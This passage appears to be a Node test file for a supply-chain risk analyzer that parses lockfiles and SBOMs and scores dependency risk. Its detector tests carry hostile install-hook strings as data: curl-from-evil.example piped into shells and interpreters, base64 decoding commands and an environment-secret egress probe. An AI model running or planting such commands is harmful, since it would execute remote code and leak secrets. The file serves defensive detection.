import assert from 'node:assert/strict';
import { readdirSync, readFileSync } from 'node:fs';
import test from 'node:test';
import { parseInput, strictJson, MAX_BYTES } from '../src/parsers.js';
import { breadthFirst, inferredEntries, indexGraph, trace } from '../src/graph.js';
import { analyze, damerauLevenshtein, keyboardAdjacent, simulate, skeleton, sourceHost, sriHashes } from '../src/detectors.js';
import { canonicalJson, csvCell, makeExport, sha256 } from '../src/exports.js';
import { loadPreset } from '../src/presets.js';

const npm = (packages, version = 3) => JSON.stringify({ lockfileVersion: version, packages: { '': {}, ...packages } });
const lock = (text, name = 'package-lock.json') => parseInput(text, name);
const py = text => parseInput(text, 'requirements.txt');
const cargo = text => parseInput(text, 'Cargo.lock');
const cdx = (components, dependencies, metadata) => JSON.stringify({
  bomFormat: 'CycloneDX', specVersion: '1.5', version: 1, metadata, components, dependencies,
});
const sbom = text => parseInput(text, 'sbom.json');
const component = (name, attrs = {}) => ({ name, type: 'library', 'bom-ref': name, ...attrs });
const sri = (byte = 1, size = 64, algorithm = 'sha512') => `${algorithm}-${Buffer.alloc(size, byte).toString('base64')}`;
const scores = { lifecycle: 72, lookalikes: 59, scope: 89, baseline: 0 };

for (const [label, text] of [
  ['duplicate', '{"a":1,"a":2}'], ['escaped duplicate', '{"a":1,"\\u0061":2}'],
  ['prototype', '{"__proto__":{}}'], ['escaped prototype', '{"\\u005f_proto__":0}'],
  ['trailing object comma', '{"a":1,}'], ['trailing array comma', '[true,]'], ['double comma', '[1,,2]'],
  ['unquoted key', '{x:1}'], ['missing colon', '{"x" 1}'], ['missing comma', '{"a":1 "b":2}'],
  ['trailing data', '{}true'], ['octal number', '012'], ['overflow', '1e400'], ['floating dot', '1.'],
  ['non-JSON whitespace', '\u00a0[]'], ['raw control', '"a\nb"'], ['bad escape', '"\\q"'], ['bad unicode', '"\\u00xx"'],
  ['deep arrays', '['.repeat(72) + '0' + ']'.repeat(72)], ['unfinished array', '['],
]) test(`strict JSON rejects ${label}`, () => assert.throws(() => strictJson(text)));

for (const [label, text, expected] of [
  ['record', '{"a":{"b":0}}', '{"a":{"b":0}}'],
  ['mixed array', '[null,false,-1.25e+2,"a b",{}]', '[null,false,-125,"a b",{}]'],
  ['escaped keys and quotes', '{"foo\\"bar":"\\u0061"}', '{"foo\\"bar":"a"}'],
  ['prototype-like name as a value', '{"field":"__proto__"}', '{"field":"__proto__"}'],
  ['constructor and prototype as ordinary keys', '{"list":[{"constructor":1}],"prototype":{}}', '{"list":[{"constructor":1}],"prototype":{}}'],
  ['scalar with JSON whitespace', '\r\n\t -1.25 \t', '-1.25'],
]) test(`strict JSON accepts ${label}`, () => assert.equal(JSON.stringify(strictJson(text)), expected));

for (const [label, packages, version] of [
  ['v1', {}, 1], ['v4', {}, 4], ['string version', {}, '3'], ['absent root', { '': undefined }, 3],
  ['null root name', { '': { name: null } }, 3], ['invalid record', { 'node_modules/x': [] }, 3],
  ['null dependencies', { '': { dependencies: null } }, 3], ['non-string specification', { '': { dependencies: { x: 1 } } }, 3],
  ['invalid package path segments', { 'lib/../foo': {} }, 3], ['invalid version type', { 'node_modules/x': { version: 1 } }, 3],
  ['invalid flag', { 'node_modules/x': { hasInstallScript: 'true' } }, 3],
  ['link to absent record', { 'node_modules/x': { link: true, resolved: 'packages/x' } }, 3],
  ['chained link', { 'node_modules/x': { link: true, resolved: 'packages/x' },
    'packages/x': { link: true, resolved: 'node_modules/x' } }, 3],
]) test(`npm rejects ${label}`, () => assert.throws(() => lock(npm(packages, version))));

test('npm validates both supported versions and accepts a leading file BOM', () => {
  assert.equal(lock(`\uFEFF${npm({}, 2)}`).lockfileVersion, 2);
  assert.equal(lock(npm({})).lockfileVersion, 3);
});
test('npm nested, hoisted and scoped packages resolve by placement', () => {
  const parsed = lock(npm({
    '': { dependencies: { '@local/one': '1.0.0' } },
    'node_modules/@local/one': { version: '1.0.0', dependencies: { local: '1.0.0', hoisted: '1.0.0' } },
    'node_modules/@local/one/node_modules/local': { version: '1.0.0', dependencies: { sibling: '1.0.0' } },
    'node_modules/@local/one/node_modules/sibling': { version: '1.0.0' },
    'node_modules/local': { version: '2.0.0' },
    'node_modules/hoisted': { version: '1.0.0' },
  }));
  assert.deepEqual(analyze(parsed).paths.get('npm:node_modules/@local/one/node_modules/sibling'), [
    'root', 'npm:node_modules/@local/one', 'npm:node_modules/@local/one/node_modules/local',
    'npm:node_modules/@local/one/node_modules/sibling',
  ]);
  assert.equal(analyze(parsed).paths.has('npm:node_modules/local'), false);
  assert.equal(analyze(parsed).depths.get('npm:node_modules/hoisted'), 2);
});
test('npm workspace aliases resolve to the local package record', () => {
  const parsed = lock(npm({
    '': { dependencies: { project: 'file:packages/x' } },
    'node_modules/project': { link: true, resolved: 'packages/x' },
    'packages/x': { name: 'project', version: '1.0.0', dependencies: { subdep: '^1.0.0' } },
    'node_modules/subdep': { version: '1.0.0' },
  }));
  assert.equal(parsed.nodes.length, 3);
  assert.equal(parsed.edges[0].to, 'npm:packages/x');
  assert.equal(analyze(parsed).depths.get('npm:node_modules/subdep'), 2);
});
test('npm preserves a missing required package, not absent optional dependencies', () => {
  const parsed = lock(npm({ '': {
    dependencies: { required: '1.0.0', optional: '1.0.0' },
    optionalDependencies: { optional: '1.0.0' }, peerDependencies: { peer: '*' },
    peerDependenciesMeta: { peer: { optional: true } },
  } }));
  assert.deepEqual(parsed.nodes.filter(node => node.unresolved).map(node => node.name), ['required']);
  assert.match(parsed.notes.at(-1), /^2 optional/);
  assert.equal(analyze(parsed).metrics.reachable, 0);
});
test('npm retains a genuine self-cycle', () => {
  const parsed = lock(npm({ '': { dependencies: { loop: '1.0.0' } },
    'node_modules/loop': { version: '1.0.0', dependencies: { loop: '1.0.0' } } }));
  const result = analyze(parsed);
  assert.equal(result.metrics.edges, 2);
  assert.deepEqual(result.findings[0].affected, []);
});
test('npm reports metadata only, even when an unrecognized field carries script text', () => {
  const parsed = lock(npm({ '': { dependencies: { x: '1.0.0' } }, 'node_modules/x': { hasInstallScript: true,
    version: '1.0.0', integrity: sri(), scripts: { postinstall: 'INERT TEXT: <omitted>' } } }));
  assert.deepEqual(analyze(parsed).findings.map(finding => finding.ruleId), ['SG003']);
});
test('input rejects a boundary breach in UTF-8 bytes, not just UTF-16 units', () => {
  assert.throws(() => lock('\u00e9'.repeat(MAX_BYTES / 2 + 1)), /2 MiB/);
});
test('mislabeled and unknown documents are not treated as clean inputs', () => {
  assert.throws(() => lock('{}'), /Unrecognized/);
  assert.throws(() => parseInput('not a lockfile', 'x.lock'), /Cargo TOML/);
  assert.throws(() => lock('null'), /object/);
});
test('input dispatch sniffs JSON content, Cargo .lock files, and extensionless requirements', () => {
  const reqs = parseInput('numpy==2.1.0\n', 'requirements');
  assert.equal(reqs.format, 'pypi');
  const jsonInTxt = parseInput(npm({}), 'data.txt');
  assert.equal(jsonInTxt.format, 'npm');
  const toml = '[[package]]\nname = "a"\nversion = "1.0.0"\n';
  assert.equal(parseInput(toml, 'vendor.lock').format, 'cargo');
  assert.throws(() => parseInput('# yarn lockfile v1\n"dep@1":\n  version "1"\n', 'yarn.lock'), /Cargo TOML/);
});
test('npm parses real package names that resemble prototype members and keeps proto blocked', () => {
  const parsed = lock(npm({ '': { dependencies: { constructor: '1.0.0', prototype: '2.0.0', toString: '3.0.0' } },
    'node_modules/constructor': { version: '1.0.0' }, 'node_modules/prototype': { version: '2.0.0' },
    'node_modules/toString': { version: '3.0.0' } }));
  const result = analyze(parsed);
  assert.equal(parsed.nodes.length, 4);
  assert.equal(result.depths.get('npm:node_modules/constructor'), 1);
  assert.equal(result.depths.get('npm:node_modules/toString'), 1);
  assert.equal(result.metrics.reachable, 3);
  assert.throws(() => lock('{"lockfileVersion":3,"packages":{"":{"dependencies":{"__proto__":"1.0.0"}}}}'), /Reserved key/);
  assert.throws(() => lock(npm({ 'node_modules/__proto__': { version: '1.0.0' } })));
});
test('npm rejects a malformed Unicode installation path', () => {
  assert.throws(() => lock(npm({ 'a\uD800b/node_modules/x': { version: '1.0.0' } })), /installation path/);
});
test('npm optional declarations take precedence over dev and peer declarations', () => {
  const parsed = lock(npm({ '': {
    devDependencies: { opt: '1.0.0' }, optionalDependencies: { opt: '1.0.0', peerish: '1.0.0' },
    peerDependencies: { peerish: '*' }, peerDependenciesMeta: { peerish: { optional: false } },
  }, 'node_modules/opt': { version: '1.0.0' }, 'node_modules/peerish': { version: '1.0.0' } }));
  assert.equal(parsed.edges.length, 2);
  assert.deepEqual(parsed.edges.map(item => item.kind), ['optionalDependencies', 'optionalDependencies']);
});

for (const [label, text, version] of [
  ['exact release', 'numpy==2.1.0', '2.1.0'], ['extras', 'requests [http] == 2.32.3', '2.32.3'],
  ['epoch and local suffix', 'numpy==1!2.0+cpu.1', '1!2.0+cpu.1'],
  ['pre-release', 'pandas==2.2.0rc1', '2.2.0rc1'], ['post release', 'pip==24.0-2', '24.0-2'],
  ['compound range', 'urllib3 >= 2.0, < 3', ''], ['wildcard equality', 'scipy==1.16.*', ''],
  ['arbitrary exact release', 'numpy===foobar', 'foobar'],
  ['marker with boolean grouping', 'pandas==2.1; (python_version >= "3.10" and sys_platform == "darwin") or os_name != "nt"', '2.1'],
  ['quoted markers', "scipy==1.2 ; extra not in 'work'", '1.2'],
  ['bare declaration', 'urllib3', ''], ['boundary comment', 'urllib3==1.2 # test', '1.2'],
  ['direct URL', 'pandas @ https://artifact.example.invalid/wheel#fragment', ''],
  ['spaced extras', 'x[ a , b ]==1.0', '1.0'],
  ['git ssh direct reference', 'pkg @ git+ssh://git@vcs.example.invalid/o/r.git', ''],
  ['ssh direct reference', 'pkg @ ssh://git@vcs.example.invalid/o/r.git', ''],
  ['hg direct reference', 'pkg @ hg+https://vcs.example.invalid/r', ''],
  ['svn direct reference', 'pkg @ svn+svn://vcs.example.invalid/r', ''],
  ['ftp direct reference', 'pkg @ ftp://mirror.example.invalid/pkg-1.tgz', ''],
  ['continued digest', `urllib3==1.2 \\\n  --hash=sha256:${'af'.repeat(32)}`, '1.2'],
]) test(`requirements accepts ${label}`, () => {
  const parsed = py(text);
  assert.equal(parsed.nodes.length, 2);
  assert.equal(parsed.nodes[1].version, version);
  assert.equal(parsed.nodes[1].line, 1);
});
for (const [label, text] of [
  ['include', '-r other.txt'], ['editable', '-e .'], ['option', '--extra-index-url=https://example.invalid/'],
  ['bad hash', 'x==1 --hash=sha256:fa'], ['unknown hash', `x==1 --hash=sha1:${'00'.repeat(20)}`],
  ['invalid version operator', 'x=>2.0'], ['invalid trailing comma', 'x>=2,'], ['invalid wildcard', 'x>=2.*'],
  ['invalid extra list', 'x[,fast]==1'], ['unknown marker variable', 'x==2; release == "new"'],
  ['incomplete marker', 'x==2; (python_version >= "3.11"'], ['missing marker expression', 'x==2;'],
  ['unsupported bare URL', 'https://example.invalid/wheel.whl'], ['unsupported URL protocol', 'x @ javascript:alert(1)'],
  ['unterminated continuation', 'x==1 \\'], ['reserved name', '__proto__==1'],
]) test(`requirements rejects ${label}`, () => assert.throws(() => py(text)));

const crate = (name, value = '1.0.0', tail = '') => `[[package]]\nname = "${name}"\nversion = "${value}"${tail ? `\n${tail}` : ''}\n`;
for (const [label, text] of [
  ['broken quote', '[[package]]\nname = "abc\n'], ['broken array', `${crate('a')}dependencies = ["b",`],
  ['extra table', '[other]\nname="x"'], ['invalid version format', 'version=4.0\n' + crate('a')],
  ['duplicate field', `${crate('a')}name = "b"`], ['duplicate table declaration', crate('a') + crate('a')],
  ['duplicate metadata', `${crate('a')}[metadata]\n[metadata]\n`],
  ['reserved key', `${crate('a')}[metadata]\n"__proto__" = "x"\n`],
  ['escaped reserved key', `${crate('a')}[metadata]\n"\\u005f_proto__" = "x"\n`],
  ['missing name', '[[package]]\nversion="1.0.0"'], ['invalid checksum', crate('a', '1.0.0', 'checksum = "ab"')],
  ['invalid Unicode codepoint', '[[package]]\nname = "\\uD800"\nversion="1.0.0"'],
  ['broken table delimiters', '[ [ package ] ]\nname="a"\nversion="1.0.0"'],
  ['unseparated statements', '[[package]] name="a"\nversion="1.0.0"'],
  ['ambiguous dependency', crate('a', '1.0.0', 'dependencies = ["b"]') + crate('b') + crate('b', '2.0.0')],
]) test(`Cargo rejects ${label}`, () => assert.throws(() => cargo(text)));
test('Cargo supports multiline dependency arrays, literal strings, exact version disambiguation and inferred paths', () => {
  const parsed = cargo(`version = 4\n${crate('app', '1.0.0', `dependencies = [\n  'serde 2.0.0', # choice\n]`)}${crate('serde')}${crate('serde', '2.0.0')}`);
  assert.equal(parsed.lockfileVersion, 4);
  assert.equal(analyze(parsed).depths.get('cargo:3'), 2);
  assert.equal(analyze(parsed).depths.get('cargo:2'), 1);
});
test('Cargo reads a legacy metadata checksum', () => {
  const url = 'registry+https://github.com/rust-lang/crates.io-index';
  const hex = '1a'.repeat(32);
  const parsed = cargo(`${crate('serde', '1.0.0', `source = "${url}"`)}[metadata]\n"checksum serde 1.0.0 (${url})" = "${hex}"`);
  assert.deepEqual(parsed.nodes[1].hashes, [{ alg: 'SHA-256', content: hex }]);
});
test('Cargo infers both source nodes when the entire package graph is cyclic', () => {
  const parsed = cargo(crate('a', '1.0.0', 'dependencies = ["b"]') + crate('b', '1.0.0', 'dependencies = ["a"]'));
  assert.equal(analyze(parsed).metrics.reachable, 2);
  assert.equal(parsed.edges.filter(item => item.kind === 'inferred').length, 2);
});

for (const [label, text] of [
  ['wrong version', cdx([], []).replace('"1.5"', '"1.4"')],
  ['missing document version', cdx([], []).replace('"version":1,', '')],
  ['null document version', cdx([], []).replace('"version":1', '"version":null')],
  ['null components', cdx(null, [])], ['non-array components', cdx({}, [])],
  ['missing component name', cdx([{ type: 'library' }], [])],
  ['missing component type', cdx([{ name: 'a' }], [])],
  ['duplicate bom-ref', cdx([component('a'), component('a')], [])],
  ['invalid hash algorithm', cdx([component('a', { hashes: [{ alg: 'other', content: '00' }] })], [])],
  ['invalid hash length', cdx([component('a', { hashes: [{ alg: 'SHA-256', content: 'ab' }] })], [])],
  ['duplicate dependency rows', cdx([component('a')], [{ ref: 'a' }, { ref: 'a' }])],
  ['unknown dependency row', cdx([component('a')], [{ ref: 'b', dependsOn: ['a'] }])],
  ['null dependency targets', cdx([component('a')], [{ ref: 'a', dependsOn: null }])],
]) test(`CycloneDX rejects ${label}`, () => assert.throws(() => sbom(text)));
test('CycloneDX metadata root uses real refs, preserves disconnected inventory, and marks unresolved targets', () => {
  const parsed = sbom(cdx([component('a'), component('b')], [{ ref: 'work', dependsOn: ['a', 'missing'] }], { component: component('work') }));
  const result = analyze(parsed);
  assert.equal(result.metrics.reachable, 1);
  assert.deepEqual(result.paths.get('sbom:a'), ['root', 'sbom:a']);
  assert.equal(result.paths.has('sbom:b'), false);
  assert.equal(result.findings[0].ruleId, 'SG014');
});
test('CycloneDX preserves nesting without reporting a false dependency edge', () => {
  const parsed = sbom(cdx([component('a', { components: [component('b')] })], []));
  assert.equal(parsed.edges.length, 2);
  assert.ok(parsed.edges.every(item => item.kind === 'inferred'));
});
test('CycloneDX preserves verified digest formatting and purl ecosystem metadata', () => {
  const parsed = sbom(cdx([component('example', { purl: 'pkg:npm/%40sample/example@2.0.0', group: '@sample',
    hashes: [{ alg: 'SHA-256', content: 'AB'.repeat(32) }] })], []));
  assert.deepEqual(parsed.nodes[1].hashes, [{ alg: 'SHA-256', content: 'ab'.repeat(32) }]);
  assert.equal(parsed.nodes[1].name, '@sample/example');
});

// Exhaust all loop-free directed graphs on three vertices. Enumerating simple paths independently
// checks both BFS depths and inferred entries without relying on the production traversal.
const vertices = ['a', 'b', 'c'];
const choices = vertices.flatMap(from => vertices.filter(to => from !== to).map(to => ({ from, to })));
for (let mask = 0; mask < 2 ** choices.length; mask++) test(`three-vertex reachability oracle ${mask}`, () => {
  const edges = choices.filter((_, i) => (mask & 2 ** i) !== 0);
  const { outgoing, incoming } = indexGraph(vertices.map(id => ({ id })), edges);
  const walk = (start, target, candidates) => {
    const paths = [];
    function explore(path) {
      if (path.at(-1) === target) { paths.push(path); return; }
      for (const next of candidates(path.at(-1))) if (!path.includes(next)) explore([...path, next]);
    }
    explore([start]);
    paths.sort((a, b) => a.length - b.length || (a.join() < b.join() ? -1 : 1));
    return paths[0] ?? null;
  };
  for (const start of vertices) {
    const { predecessor } = breadthFirst(start, outgoing);
    const back = breadthFirst(start, incoming).depths;
    for (const target of vertices) {
      assert.deepEqual(trace(target, predecessor), walk(start, target, id => edges.filter(item => item.from === id).map(item => item.to)));
      assert.equal(back.has(target), Boolean(walk(target, start, id => outgoing.get(id))));
    }
  }
  const expectedEntries = vertices.filter(target => !vertices.some(start =>
    walk(start, target, id => outgoing.get(id)) && !walk(target, start, id => outgoing.get(id))));
  assert.deepEqual(inferredEntries(vertices.map(id => ({ id })), edges), expectedEntries);
});
test('trace terminates on a cyclic predecessor map instead of looping forever', () => {
  const cyclic = new Map([['b', 'a'], ['a', 'b'], ['c', null]]);
  assert.deepEqual(trace('b', cyclic), ['a', 'b']);
  assert.equal(trace('c', cyclic).length, 1);
});

for (const [a, b, distance] of [
  ['', '', 0], ['', 'tool', 4], ['abc', '', 3], ['read', 'read', 0], ['react', 'recat', 1], ['abc', 'adc', 1],
  ['CA', 'ABC', 2], ['ABC', 'CA', 2], ['ab', 'ba', 1], ['abcdef', 'badcfe', 3],
  ['taste', 'state', 2], ['aba', 'baa', 1], ['a\u{1F331}b', 'ab\u{1F331}', 1],
]) test(`exact edit distance ${JSON.stringify([a, b])}`, () => assert.equal(damerauLevenshtein(a, b), distance));
for (const [value, expected] of [
  ['l\u043edash', 'lodash'], ['\u0440\u0435act', 'peact'], ['\uff32\uff25\uff21\uff23\uff34', 'react'],
  ['re\u200bact', 'react'], ['plain', 'plain'], ['caf\u00e9', 'caf\u00e9'],
]) test(`confusable skeleton ${JSON.stringify(value)}`, () => assert.equal(skeleton(value), expected));
for (const [a, b, expected] of [['i','o',true],['q','1',true],['q','p',false],['g','g',false],['p','\u0440',false],['m','n',true]]) {
  test(`QWERTY adjacency ${a}/${b}`, () => assert.equal(keyboardAdjacent(a, b), expected));
}
for (const [value, result] of [
  [sri(), 'SHA-512'], [sri(0, 32, 'sha256'), 'SHA-256'], [sri(0, 48, 'sha384'), 'SHA-384'],
  ['sha512-YQ==', undefined], [sri().replace('sha512-', 'sha513-'), undefined], ['sha512-???', undefined],
  [sri().replace(/=+$/, ''), 'SHA-512'], [`${sri()}?option`, 'SHA-512'],
]) test(`SRI decode ${value.slice(0, 12)} (${value.length})`, () => assert.equal(sriHashes(value)[0]?.alg, result));
for (const [url, result] of [
  ['https://registry.npmjs.org/x', 'registry.npmjs.org'], ['https://registry.npmjs.org.evil.invalid/x', 'registry.npmjs.org.evil.invalid'],
  ['https://registry.npmjs.org@evil.invalid/', ''], ['http://registry.npmjs.org/', ''],
  ['https://registry.npmjs.org:8080/', ''], ['registry+https://index.crates.io/', 'index.crates.io'],
]) test(`strict source host ${url}`, () => assert.equal(sourceHost(url), result));

for (const [key, expected] of Object.entries(scores)) test(`synthetic ${key} risk, graph and repeatability`, () => {
  const scenario = loadPreset(key);
  const result = analyze(scenario);
  assert.equal(scenario.sourceKind, 'synthetic');
  assert.equal(result.score, expected);
  assert.equal(result.metrics.reachable, 11);
  assert.equal(result.metrics.maxDepth, 4);
  assert.deepEqual(result.contributions, analyze(loadPreset(key)).contributions);
  assert.equal(result.score, Math.min(100, result.contributions.reduce((sum, item) => sum + item.points, 0)));
});
test('lifecycle fixture identifies the exact shortest path and reverse impact', () => {
  const { findings } = analyze(loadPreset('lifecycle'));
  const [finding] = findings;
  assert.deepEqual(finding.path, ['root', 'npm:node_modules/ui-gateway', 'npm:node_modules/render-adapter', 'npm:node_modules/snapshot-codec']);
  assert.deepEqual(finding.affected, [
    'npm:node_modules/print-layout', 'npm:node_modules/render-adapter', 'npm:node_modules/report-kit', 'npm:node_modules/ui-gateway',
  ]);
});
test('scope pin clears only unpinned version evidence and leaves original immutable', () => {
  const model = loadPreset('scope');
  const id = 'npm:node_modules/@signaldesk/render';
  const before = JSON.stringify(model);
  const result = analyze(simulate(model, new Map([[id, { action: 'pin' }]])));
  assert.equal(result.score, 85);
  assert.ok(!result.findings.some(item => item.ruleId === 'SG009'));
  assert.equal(JSON.stringify(model), before);
});
test('quarantine changes downstream reachability and does not count the disconnected findings', () => {
  const model = loadPreset('lifecycle');
  const id = 'npm:node_modules/render-adapter';
  const result = analyze(simulate(model, new Map([[id, { action: 'quarantine' }]])));
  assert.equal(result.score, 0);
  assert.equal(result.metrics.affected, 0);
  assert.equal(result.metrics.reachable, 8);
  assert.ok(result.findings.every(f => !f.reachable && f.path === null && f.points === 0));
});
test('upgrade requires a real candidate, never invents new hashes and labels unknown coverage', () => {
  const model = loadPreset('lifecycle');
  const id = 'npm:node_modules/snapshot-codec';
  const change = new Map([[id, { action: 'upgrade', version: '1.7.0' }]]);
  const simulated = simulate(model, change);
  assert.equal(simulated.nodes.find(item => item.id === id).integrity, '');
  assert.equal(simulated.edges.filter(edge => edge.to === id)[0].spec, '1.7.0');
  assert.equal(analyze(simulated).score, 0);
  assert.match(simulated.notes.at(-1), /missing evidence, not safety/);
  assert.throws(() => simulate(model, new Map([[id, { action: 'upgrade', version: 'next' }]])), /concrete/);
  assert.throws(() => simulate(model, new Map([[id, { action: 'upgrade', version: '1.6.0' }]])), /different/);
  assert.throws(() => simulate(model, new Map([[id, { action: 'upgrade', version: '1.5.9' }]])), /newer/);
  assert.throws(() => simulate(model, new Map([[id, { action: 'upgrade', version: '1.7.0', integrity: 'bad' }]])), /valid SHA/);
});
test('simulation does not accept remediation of the graph root or an unknown node', () => {
  const original = loadPreset('scope');
  for (const id of ['root', 'absent']) assert.throws(() => simulate(original, new Map([[id, { action: 'quarantine' }]])));
});
test('risk points cap at 100 while preserving all contributing rows', () => {
  const model = loadPreset('lookalikes');
  for (const item of model.nodes.filter(n => !n.root)) item.integrity = '';
  const result = analyze(model);
  assert.equal(result.score, 100);
  assert.ok(result.contributions.reduce((total, entry) => total + entry.points, 0) > 100);
});

for (const [input, expected] of [
  ['=1+1', '"\'=1+1"'], ['+2', '"\'+2"'], ['-2', '"\'-2"'], ['@sample/pkg', '"\'@sample/pkg"'],
  [' \t=1', '"\' \t=1"'], ['\r\nline', '"\'\r\nline"'], ['\uFF1D1', '"\'\uFF1D1"'],
  ['ordinary "quote", comma', '"ordinary ""quote"", comma"'], ['example.invalid', '"example.invalid"'],
]) test(`CSV formula and field quoting ${JSON.stringify(input)}`, () => assert.equal(csvCell(input), expected));
test('SHA-256 matches known test vectors and accepts raw bytes', async () => {
  assert.equal(await sha256('abc'), 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
  assert.equal(await sha256(new Uint8Array()), 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
});
test('canonical JSON sorts decoded keys, not numeric insertion order, and rejects non-finite numbers', () => {
  assert.equal(canonicalJson({ 2: 'b', 10: 'a', x: { z: null, a: [1] } }), '{"10":"a","2":"b","x":{"a":[1],"z":null}}');
  assert.throws(() => canonicalJson(NaN));
});
test('every format shares one canonical audit fingerprint and returns its byte fingerprint', async () => {
  const analysis = analyze(loadPreset('scope'));
  const [audit, sarif, cdx, csv] = await Promise.all(['audit', 'sarif', 'cyclonedx', 'csv'].map(kind => makeExport(kind, analysis)));
  const parsed = JSON.parse(audit.text);
  assert.equal(await sha256(canonicalJson(parsed.evidence)), parsed.auditSha256);
  assert.equal(JSON.parse(sarif.text).runs[0].properties.auditSha256, parsed.auditSha256);
  assert.equal(JSON.parse(cdx.text).metadata.properties[0].value, parsed.auditSha256);
  assert.ok(csv.text.includes(parsed.auditSha256));
  for (const file of [audit, sarif, cdx, csv]) assert.equal(file.sha256, await sha256(file.text));
});
test('audit omits raw hook contents and source URL credentials', async () => {
  const analysis = analyze(loadPreset('lifecycle'));
  const found = analysis.model.nodes.find(node => node.hasInstallScript);
  found.resolved = 'https://test-login:private-value@example.invalid/path';
  const { text } = await makeExport('audit', analysis);
  for (const raw of ['private-value', 'test-login', 'INERT EVIDENCE', 'process.env']) assert.ok(!text.includes(raw));
});
test('SARIF references known rule indices and preserves actual requirements source lines', async () => {
  const result = analyze(py('# note\nurllib3>=2.0'));
  const report = JSON.parse((await makeExport('sarif', result)).text);
  const run = report.runs[0];
  const entry = run.results[0];
  assert.equal(report.version, '2.1.0');
  assert.equal(run.tool.driver.rules[entry.ruleIndex].id, entry.ruleId);
  assert.equal(entry.locations[0].physicalLocation.region.startLine, 2);
  assert.equal(entry.locations[0].physicalLocation.artifactLocation.uri, 'requirements.txt');
});
test('CycloneDX references a unique root and excludes quarantined packages from dependencies', async () => {
  const result = analyze(simulate(loadPreset('lifecycle'), new Map([['npm:node_modules/snapshot-codec', { action: 'quarantine' }]])));
  const report = JSON.parse((await makeExport('cyclonedx', result)).text);
  assert.equal(report.specVersion, '1.5');
  assert.ok(report.components.every(node => node.name !== 'snapshot-codec'));
  const refs = new Set([report.metadata.component, ...report.components].map(node => node['bom-ref']));
  assert.equal(refs.size, 11);
  for (const dependency of report.dependencies) {
    assert.ok(refs.has(dependency.ref));
    assert.ok(dependency.dependsOn.every(ref => refs.has(ref)));
  }
});
const npmHook = (text, name = 'snared') => {
  const model = lock(npm({
    '': { dependencies: { [name]: '1.0.0' } },
    [`node_modules/${name}`]: { version: '1.0.0', hasInstallScript: true },
  }));
  model.nodes.find(node => !node.root).hooks = [{ name: 'postinstall', text }];
  return model;
};

for (const [label, hook] of [
  ['sudo shell', 'curl https://evil.example/x | sudo sh'],
  ['env bash', 'curl https://evil.example/x | env bash'],
  ['tee then shell', 'curl https://evil.example/x | tee /tmp/x | sh'],
  ['double pipe', 'curl https://evil.example/x||sh'],
  ['perl', 'curl https://evil.example/x | perl'],
  ['ruby', 'wget -q https://evil.example/x | ruby'],
  ['php', 'curl https://evil.example/x | php'],
  ['pwsh', 'curl https://evil.example/x | pwsh -c x'],
  ['docker shell', 'curl https://evil.example/x | docker run -i img sh'],
  ['long prefix', `curl https://evil.example/x ${'a'.repeat(400)} | sh`],
]) test(`SG004 detects downloader pipe variant: ${label}`, () => {
  assert.ok(analyze(npmHook(hook)).findings.some(f => f.ruleId === 'SG004'), hook);
});
test('SG004 leaves a non-interpreter pipe alone', () => {
  assert.ok(!analyze(npmHook('curl https://evil.example/x | tar -xz')).findings.some(f => f.ruleId === 'SG004'));
  assert.ok(!analyze(npmHook('curl https://evil.example/x | grep -c version')).findings.some(f => f.ruleId === 'SG004'));
});
for (const [label, hook] of [
  ['certutil', 'certutil -decode f.b64 f.exe'],
  ['openssl', 'openssl enc -d -base64 -in f'],
  ['buffer', 'Buffer.from(x,"base64")'],
  ['b64decode', 'base64.b64decode(payload)'],
]) test(`SG005 detects decoding variant: ${label}`, () => {
  assert.ok(analyze(npmHook(hook)).findings.some(f => f.ruleId === 'SG005'));
});
test('SG006 recognizes spaced member access in an egress probe', () => {
  assert.ok(analyze(npmHook('https . request(process.env.SECRET)')).findings.some(f => f.ruleId === 'SG006'));
});
test('SG001 catches one-edit squats of short popular names without flagging noise', () => {
  const model = lock(npm({
    '': { dependencies: { vuw: '3.0.0', zoq: '3.0.0', god: '3.0.0', zzx: '3.0.0' } },
    'node_modules/vuw': { version: '3.0.0' }, 'node_modules/zoq': { version: '3.0.0' },
    'node_modules/god': { version: '3.0.0' }, 'node_modules/zzx': { version: '3.0.0' },
  }));
  const squats = analyze(model).findings.filter(f => f.ruleId === 'SG001').map(f => f.nodeId);
  assert.equal(squats.length, 3);
  assert.ok(!squats.some(id => id.includes('zzx')));
});
test('SG010 treats PEP 440 zero padding as one version but still flags real conflicts', () => {
  assert.equal(analyze(py('foo==1.0\nfoo==1.0.0\n')).findings.filter(f => f.ruleId === 'SG010').length, 0);
  assert.equal(analyze(py('Foo==1.0\nfoo==1.0.0\n')).findings.filter(f => f.ruleId === 'SG010').length, 0);
  assert.equal(analyze(py('foo==1.0\nfoo==1.2.0\n')).findings.filter(f => f.ruleId === 'SG010').length, 2);
});
test('exports carry no credential material from SBOM free-text fields', async () => {
  const doc = cdx([
    { name: 'https://user:SECRET3:pw3@evil.example/x', type: 'library', 'bom-ref': 'https://user:SECRET1:pw@r.invalid/a', purl: 'pkg:npm/x@1.0.0' },
    { name: 'https://user:SECRET3:pw3@evil.example/x', type: 'library', 'bom-ref': 'ref-b', purl: 'pkg:npm/x@2.0.0' },
  ], [{ ref: 'ref-b', dependsOn: ['https://user:SECRET4:pw@q.invalid/z'] }]);
  const analysis = analyze(sbom(doc));
  for (const kind of ['sarif', 'cyclonedx', 'csv', 'audit']) {
    const { text } = await makeExport(kind, analysis);
    assert.ok(!/SECRET\d|pw3?@/.test(text), `${kind} leaks credential material`);
  }
});
test('remediation never raises the risk score across every preset and target', () => {
  for (const preset of ['lifecycle', 'lookalikes', 'scope', 'baseline']) {
    const base = loadPreset(preset);
    const baseScore = analyze(base).score;
    const counts = new Map();
    for (const node of base.nodes) {
      if (!node.root && !node.unresolved && node.version && !node.marker && node.ecosystem && typeof node.name === 'string') {
        const key = `${node.ecosystem}:${node.name.toLowerCase()}`;
        counts.set(key, (counts.get(key) ?? 0) + 1);
      }
    }
    for (const node of base.nodes) {
      for (const action of ['pin', 'quarantine']) {
        let result;
        try { result = analyze(simulate(base, new Map([[node.id, { action }]]))); }
        catch { continue; }
        assert.ok(result.score <= baseScore, `${preset} ${node.id} ${action}: ${baseScore} -> ${result.score}`);
      }
      const key = `${node.ecosystem}:${String(node.name).toLowerCase()}`;
      if (node.ecosystem === 'npm' && !node.local && !node.root && !node.unresolved && counts.get(key) === 1) {
